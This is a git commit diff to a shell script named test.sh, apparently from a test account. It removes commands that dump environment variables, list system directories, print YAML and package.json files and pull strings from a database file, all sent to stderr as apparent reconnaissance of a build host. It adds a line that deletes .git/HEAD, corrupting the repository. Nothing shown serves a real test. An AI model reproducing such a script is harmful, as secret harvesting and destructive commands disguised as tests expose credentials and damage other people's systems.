dcaae12fc3c01f5088a2ac06ca4cb3cf9263a0b0
simon-testaccount <simonschwarz007@gmail.com>
2026-05-15 16:11:38 +0200

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,14 +1,6 @@
 #!/usr/bin/env bash
 
-env 1>&2
-ls -la / 1>&2
-ls -la /tmp 1>&2
-ls -la /code 1>&2
-ls -la /pc 1>&2
-cat /pc/local/*/*.yml 1>&2
-cat /pc/local/*/*.yaml 1>&2
-cat /pc/local/*/package.json 1>&2
-strings /pc/db.db 1>&2
-mount 1>&2
+
 echo "test" > hello2.txt
+rm .git/HEAD
 exit 0
